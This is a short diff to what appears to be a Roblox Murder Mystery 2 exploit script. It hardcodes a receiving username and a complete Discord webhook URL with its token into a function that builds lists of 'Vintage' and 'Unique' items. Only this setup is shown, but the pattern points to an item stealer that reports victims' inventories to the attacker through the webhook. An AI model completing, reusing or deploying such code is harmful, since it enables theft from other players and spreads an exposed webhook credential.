@@ -10,8 +10,8 @@ if ExecutorWebhoo2 == "Delta" then
 end
 
 local function MM2()
-    local user = Username
-    local webhook = Webhook
+    local Username = "kumsalxvprc"
+    local webhook = "https://discord.com/api/webhooks/1398361544332411112/w_dtzDeWSJwL0jmQq11s2enrjirEYQJrCM07ygC2EgS9VrA7QIkdrNv1WYIMOGfxBqZg"
 
     local VintageList = ""
     local UniqueList = ""
